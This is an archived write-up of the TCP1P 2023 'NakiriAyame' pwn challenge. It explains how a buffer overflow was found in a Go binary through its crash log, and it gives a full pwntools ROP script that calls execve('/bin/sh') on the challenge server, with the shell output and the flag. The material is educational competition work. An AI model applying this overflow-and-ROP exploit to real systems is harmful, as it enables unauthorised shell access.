# NakiriAyame

**CTF:** TCP1P 2023  
**Category:** pwn  
**Original writeup:** <https://chovid99.github.io/posts/tcp1p-ctf-2023/#nakiriayame> — by **chovid99**. All credit goes to the original author; this is an archived copy.

---

NakiriAyame

Description Author: HyggeHalcyon Ayame cute noises (✿╹◡╹) https://www.youtube.com/watch?v=XsdQguLgvFc https://www.youtube.com/watch?v=NPMhb_mIIhU nc ctf.tcp1p.com 6666

Solution

We were given a binary called ojou . Trying to disassemble it, we noticed that it’s a golang binary, which is statically linked. We didn’t want to check the whole disassembled result, so we just ran the binary, tried some inputs, and sometimes peeked at the disassembled result.

1 2 3 nc ctf.tcp1p.com 6666 Who's the cutest vtuber? >>

Looking through the disassembly, we saw that we need to respond with Ojou! <3 for the binary to return YES and a gift, which is the address of /bin/sh . This information is somewhat pointless because the binary is statically linked, meaning we already know the address of /bin/sh .

Playing around with it, we found that there’s a crash log if we input a bunch of a s after the null-terminated string Ojou! <3 . Here’s an example of the crash log when we send the input b'Ojou! <3\x00' + b'a'*0x180 :

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [+] Starting local process './ojou': pid 15303 [*] Switching to interactive mode Who's the cutest vtuber? >> YES Gift for you: *(0x520690) runtime: out of memory: cannot allocate 7016996765295443968-byte block (3899392 in use) fatal error: out of memory goroutine 1 [running]: runtime.throw({0x4988c7?, 0x476d8c?}) /usr/local/go/src/runtime/panic.go:1077 +0x5c fp=0xc0000aeca0 sp=0xc0000aec70 pc=0x4308fc runtime.(*mcache).allocLarge(0x1a?, 0x6161616161616161, 0x1?) /usr/local/go/src/runtime/mcache.go:236 +0x176 fp=0xc0000aece8 sp=0xc0000aeca0 pc=0x412db6 runtime.mallocgc(0x6161616161616161, 0x0, 0x0) /usr/local/go/src/runtime/malloc.go:1123 +0x4f6 fp=0xc0000aed50 sp=0xc0000aece8 pc=0x40b956 runtime.slicebytetostring(0xc0000aef77?, 0x6161616161616161, 0x6161616161616161) /usr/local/go/src/runtime/string.go:112 +0x77 fp=0xc0000aed80 sp=0xc0000aed50 pc=0x44a1b7 main.main() /home/kali/Desktop/kirakira/main.go:37 +0x2e7 fp=0xc0000aef40 sp=0xc0000aed80 pc=0x47ddc7 runtime: g 1: unexpected return pc for main.main called from 0x6161616161616161

Based on the error message, we concluded that there’s a buffer overflow, and we could probably do ROP to call execve("/bin/sh", 0, 0) . After some experimentation to find the appropriate offset, we discovered that we need to add 0x141 characters after Ojou! <3\x00 to start affecting the PC.

So, the next step was just to locate the suitable gadgets with the assistance of ROPGadget , and then carry out the ROP. Below is the complete script that we used:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from pwn import * r = remote ( 'ctf.tcp1p.com' , 6666 ) pop_rax_rbp = 0x004723ca pop_rdi = 0x004726a4 pop_rdx = 0x00479d7a syscall = 0x00465b2d vtuber = b 'Ojou! <3 \x00 ' # ROP to trigger execve("/bin/sh", 0, 0) payload = b ' \x00 ' * 1 payload += b ' \x00 ' * ( 0x140 ) payload += p64 ( pop_rdx ) payload += p64 ( 0 ) payload += p64 ( pop_rax_rbp ) payload += p64 ( 0x400160 ) # Set [rax] to 0 payload += p64 ( 0 ) payload += p64 ( pop_rdi ) payload += p64 ( 0x497d19 ) payload += p64 ( pop_rax_rbp ) payload += p64 ( 0x3b ) payload += p64 ( 0 ) payload += p64 ( syscall ) r . sendlineafter ( b '>> ' , vtuber + payload ) r . interactive ()

Running the script, we got the shell:

1 2 3 4 5 6 [ + ] Opening connection to ctf . tcp1p . com on port 6666 : Done [ * ] Switching to interactive mode YES Gift for you : * ( 0x520690 ) Ayame cuteeee $ cat flag . txt TCP1P { Ojou_sama_no_giggles_cuteness_overload_kawayoooooo ! }

Flag: TCP1P{Ojou_sama_no_giggles_cuteness_overload_kawayoooooo!}
